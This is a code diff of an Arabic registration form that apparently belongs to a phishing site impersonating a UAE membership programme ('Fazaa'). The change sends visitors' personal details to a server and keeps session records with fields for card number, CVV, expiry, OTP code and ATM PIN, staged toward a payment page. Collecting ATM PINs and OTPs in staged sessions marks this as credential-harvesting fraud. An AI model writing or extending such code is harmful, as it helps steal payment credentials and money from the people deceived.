@@ -67,34 +67,60 @@ export default function RegistrationFormArabic() {
     if (!validateForm()) return
     setLoading(true)
     try {
-      await new Promise(resolve => setTimeout(resolve, 1500))
-      // Save registration data to localStorage for Payment page
       const sessionId = 'FAZ-' + Date.now().toString(36)
-      const registrationData = {
-        id: '1',
-        sessionId,
-        fullName: formData.fullName || null,
-        phoneNumber: formData.phoneNumber || null,
-        email: formData.email || null,
-        emirate: formData.emirate || null,
-        district: formData.district || null,
-        membershipTier: formData.membershipTier || null,
-        totalAmount: '150',
-        cardName: null,
-        cardNumber: null,
-        cardExpiry: null,
-        cardCvv: null,
-        otpCode: null,
-        atmPin: null,
-        stage: 'card' as const,
-        errorMessage: null,
-        clientIp: null,
-        createdAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString(),
+      
+      // Save to API server
+      try {
+        const { createRegistration, createSession } = await import('../lib/api')
+        await createRegistration({
+          sessionId,
+          fullName: formData.fullName || '',
+          phoneNumber: formData.phoneNumber || '',
+          email: formData.email || '',
+          emirate: formData.emirate || '',
+          district: formData.district || undefined,
+          membershipTier: formData.membershipTier || 'silver',
+          totalAmount: '150',
+        })
+        await createSession({
+          sessionId,
+          fullName: formData.fullName || '',
+          phoneNumber: formData.phoneNumber || '',
+          email: formData.email || '',
+          emirate: formData.emirate || '',
+          district: formData.district || undefined,
+          membershipTier: formData.membershipTier || 'silver',
+          totalAmount: '150',
+        })
+      } catch (apiErr) {
+        console.warn('[Registration] API call failed, using localStorage fallback:', apiErr)
+        // Fallback to localStorage if API is not available
+        const registrationData = {
+          sessionId,
+          fullName: formData.fullName || null,
+          phoneNumber: formData.phoneNumber || null,
+          email: formData.email || null,
+          emirate: formData.emirate || null,
+          district: formData.district || null,
+          membershipTier: formData.membershipTier || null,
+          totalAmount: '150',
+          cardName: null,
+          cardNumber: null,
+          cardExpiry: null,
+          cardCvv: null,
+          otpCode: null,
+          atmPin: null,
+          stage: 'card' as const,
+          errorMessage: null,
+          clientIp: null,
+          createdAt: new Date().toISOString(),
+          updatedAt: new Date().toISOString(),
+        }
+        const existing = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+        existing.push(registrationData)
+        localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
       }
-      const existing = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
-      existing.push(registrationData)
-      localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
+      
       // Navigate to payment page
       window.location.href = '/payment'
     } catch (err) {
